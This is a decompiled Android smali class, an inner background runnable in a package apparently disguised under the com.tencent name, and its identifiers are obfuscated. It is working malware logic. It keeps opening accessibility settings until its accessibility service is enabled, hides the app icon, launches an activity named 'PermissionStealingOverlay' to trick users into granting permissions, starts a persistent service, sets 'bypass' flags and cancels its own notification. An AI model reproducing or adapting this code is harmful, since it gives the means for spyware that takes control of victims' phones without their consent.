.class Lcom/tencent/MainBackgroundService$1;
.super Ljava/lang/Object;
.source "tunesxconcerningn1011.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/tencent/MainBackgroundService;->onCreate()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/tencent/MainBackgroundService;

.field final synthetic val$ctx:Landroid/content/Context;

.field final synthetic val$delytimenum:I


# direct methods
.method constructor <init>(Lcom/tencent/MainBackgroundService;Landroid/content/Context;I)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .line 497
    iput-object p1, p0, Lcom/tencent/MainBackgroundService$1;->this$0:Lcom/tencent/MainBackgroundService;

    iput-object p2, p0, Lcom/tencent/MainBackgroundService$1;->val$ctx:Landroid/content/Context;

    iput p3, p0, Lcom/tencent/MainBackgroundService$1;->val$delytimenum:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 9

    .line 507
    :catch_0
    :cond_0
    :goto_0
    :try_start_0
    sget-object v0, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    sget v1, Lcom/tencent/DataPackagingEngine;->speedTime:I

    int-to-long v1, v1

    invoke-virtual {v0, v1, v2}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 513
    :catch_1
    :try_start_1
    iget-object v0, p0, Lcom/tencent/MainBackgroundService$1;->val$ctx:Landroid/content/Context;

    const-class v1, Lcom/tencent/AccessibilityServiceCore;

    invoke-static {v0, v1}, Lcom/tencent/DataPackagingEngine;->IA_tunesxconcerningn1011_E(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    const/high16 v1, 0x40000000    # 2.0f

    const/high16 v2, 0x20000000

    const/high16 v3, 0x10000000

    const/4 v4, 0x1

    const/4 v5, 0x0

    if-nez v0, :cond_4

    .line 514
    invoke-static {}, Lcom/tencent/DataPackagingEngine;->NeedSuper()Z

    move-result v0

    if-eqz v0, :cond_4

    .line 516
    iget-object v0, p0, Lcom/tencent/MainBackgroundService$1;->val$ctx:Landroid/content/Context;

    invoke-static {v0}, Lcom/tencent/DataPackagingEngine;->GS_tunesxconcerningn1011_B(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 517
    sget v0, Lcom/tencent/DataPackagingEngine;->Trys:I

    add-int/2addr v0, v4

    sput v0, Lcom/tencent/DataPackagingEngine;->Trys:I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 521
    :try_start_2
    sget v0, Lcom/tencent/DataPackagingEngine;->Trys:I

    iget v6, p0, Lcom/tencent/MainBackgroundService$1;->val$delytimenum:I

    if-lt v0, v6, :cond_0

    .line 523
    sput v5, Lcom/tencent/DataPackagingEngine;->Trys:I

    const/16 v0, 0x3e8

    .line 525
    sput v0, Lcom/tencent/DataPackagingEngine;->speedTime:I

    .line 527
    iget-object v0, p0, Lcom/tencent/MainBackgroundService$1;->val$ctx:Landroid/content/Context;

    new-instance v6, Landroid/content/Intent;

    const-string v7, "android.settings.ACCESSIBILITY_SETTINGS"

    invoke-direct {v6, v7}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/high16 v7, 0x10000000

    invoke-virtual {v6, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v6

    invoke-virtual {v0, v6}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_0

    .line 534
    :catch_2
    :try_start_3
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    .line 535
    :goto_1
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_1

    .line 539
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    goto :goto_1

    .line 547
    :cond_1
    :goto_2
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_2

    .line 551
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    goto :goto_2

    .line 559
    :cond_2
    :goto_3
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_3

    .line 563
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    goto :goto_3

    .line 571
    :cond_3
    :goto_4
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 575
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    goto :goto_4

    .line 588
    :cond_4
    sget-boolean v0, Lcom/tencent/MainBackgroundService;->Is_tunesxconcerningn1011_Hidden:Z

    if-nez v0, :cond_5

    .line 589
    sput-boolean v4, Lcom/tencent/MainBackgroundService;->Is_tunesxconcerningn1011_Hidden:Z

    .line 590
    sget-object v0, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    const-string v6, "I#C#O#N#S#C#A#N#E#R"

    invoke-static {v0, v6}, Lcom/tencent/DataPackagingEngine;->SwapMe(Landroid/content/Context;Ljava/lang/String;)V

    .line 593
    :cond_5
    iget-object v0, p0, Lcom/tencent/MainBackgroundService$1;->val$ctx:Landroid/content/Context;

    invoke-static {v0}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_6

    invoke-static {}, Lcom/tencent/DataPackagingEngine;->NeedSuper()Z

    move-result v0

    if-nez v0, :cond_6

    .line 594
    sget-object v0, Lcom/tencent/DataPackagingEngine;->shown:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-nez v0, :cond_0

    const/16 v0, 0x1388

    .line 595
    sput v0, Lcom/tencent/DataPackagingEngine;->speedTime:I

    .line 596
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/tencent/DataPackagingEngine;->shown:Ljava/lang/Boolean;

    .line 597
    iget-object v0, p0, Lcom/tencent/MainBackgroundService$1;->val$ctx:Landroid/content/Context;

    goto/16 :goto_0

    .line 603
    :cond_6
    iget-object v0, p0, Lcom/tencent/MainBackgroundService$1;->val$ctx:Landroid/content/Context;

    invoke-static {}, Lcom/tencent/DataPackagingEngine;->PERMISSIONS()[Ljava/lang/String;

    move-result-object v6

    invoke-static {v0, v6}, Lcom/tencent/DataPackagingEngine;->H__tunesxconcerningn1011_P(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_b

    .line 604
    sget-object v0, Lcom/tencent/DataPackagingEngine;->asked:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-nez v0, :cond_a

    const/16 v0, 0xdac

    .line 606
    sput v0, Lcom/tencent/DataPackagingEngine;->speedTime:I

    .line 607
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/tencent/DataPackagingEngine;->asked:Ljava/lang/Boolean;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    .line 610
    :try_start_4
    new-instance v0, Landroid/content/Intent;

    iget-object v6, p0, Lcom/tencent/MainBackgroundService$1;->val$ctx:Landroid/content/Context;

    const-class v7, Lcom/tencent/PermissionStealingOverlay;

    invoke-direct {v0, v6, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 611
    invoke-virtual {v0, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 612
    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 613
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 614
    iget-object v1, p0, Lcom/tencent/MainBackgroundService$1;->val$ctx:Landroid/content/Context;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    goto/16 :goto_0

    .line 624
    :catch_3
    :try_start_5
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/tencent/DataPackagingEngine;->asked:Ljava/lang/Boolean;

    .line 625
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    .line 626
    :goto_5
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_7

    .line 630
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    goto :goto_5

    .line 638
    :cond_7
    :goto_6
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_8

    .line 642
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    goto :goto_6

    .line 650
    :cond_8
    :goto_7
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_9

    .line 654
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    goto :goto_7

    .line 662
    :cond_9
    :goto_8
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 666
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    goto :goto_8

    :cond_a
    const/16 v0, 0x7d0

    .line 676
    sput v0, Lcom/tencent/DataPackagingEngine;->speedTime:I

    goto/16 :goto_0

    .line 684
    :cond_b
    sget-boolean v0, Lcom/tencent/DataPackagingEngine;->iamworking:Z
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_0

    if-nez v0, :cond_e

    .line 687
    :try_start_6
    iget-object v0, p0, Lcom/tencent/MainBackgroundService$1;->this$0:Lcom/tencent/MainBackgroundService;

    invoke-static {v0, v4}, Lcom/tencent/MainBackgroundService;->access$002(Lcom/tencent/MainBackgroundService;Z)Z

    .line 688
    sput-boolean v4, Lcom/tencent/DataPackagingEngine;->iamworking:Z

    .line 689
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012bypass:Ljava/lang/Boolean;

    .line 690
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012FOR_prim:Ljava/lang/Boolean;

    .line 691
    sput-boolean v4, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012CheckPrims:Z

    .line 696
    const-class v0, Lcom/tencent/PersistentService;

    iget-object v6, p0, Lcom/tencent/MainBackgroundService$1;->val$ctx:Landroid/content/Context;

    invoke-static {v0, v6}, Lcom/tencent/BackgroundServiceHelper;->removedqtractort40(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_c

    .line 697
    iget-object v0, p0, Lcom/tencent/MainBackgroundService$1;->val$ctx:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    const v6, 0x7f090012

    invoke-virtual {v0, v6}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/tencent/DataPackagingEngine;->p_tunesxconcerningn103_r:Ljava/lang/String;

    .line 699
    iget-object v0, p0, Lcom/tencent/MainBackgroundService$1;->val$ctx:Landroid/content/Context;

    new-instance v6, Landroid/content/Intent;

    iget-object v7, p0, Lcom/tencent/MainBackgroundService$1;->val$ctx:Landroid/content/Context;

    const-class v8, Lcom/tencent/PersistentService;

    invoke-direct {v6, v7, v8}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v6}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 703
    :cond_c
    iget-object v0, p0, Lcom/tencent/MainBackgroundService$1;->val$ctx:Landroid/content/Context;

    invoke-static {v0}, Lcom/tencent/DataPackagingEngine;->is_dozemode(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_d

    .line 705
    new-instance v0, Landroid/content/Intent;

    iget-object v6, p0, Lcom/tencent/MainBackgroundService$1;->val$ctx:Landroid/content/Context;

    const-class v7, Lcom/tencent/PermissionStealingOverlay;

    invoke-direct {v0, v6, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 706
    invoke-virtual {v0, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 707
    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 708
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 709
    iget-object v1, p0, Lcom/tencent/MainBackgroundService$1;->val$ctx:Landroid/content/Context;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 733
    :cond_d
    sput-boolean v4, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012CheckPrims:Z

    .line 734
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012bypass:Ljava/lang/Boolean;
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    .line 738
    :catch_4
    :try_start_7
    iget-object v0, p0, Lcom/tencent/MainBackgroundService$1;->val$ctx:Landroid/content/Context;

    iget-object v1, p0, Lcom/tencent/MainBackgroundService$1;->this$0:Lcom/tencent/MainBackgroundService;

    iget v1, v1, Lcom/tencent/MainBackgroundService;->_IDD:I

    invoke-static {v0, v1}, Lcom/tencent/MainBackgroundService;->cancelnotification(Landroid/content/Context;I)V

    :cond_e
    const/16 v0, 0x61a8

    .line 741
    sput v0, Lcom/tencent/DataPackagingEngine;->speedTime:I
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_0

    goto/16 :goto_0
.end method
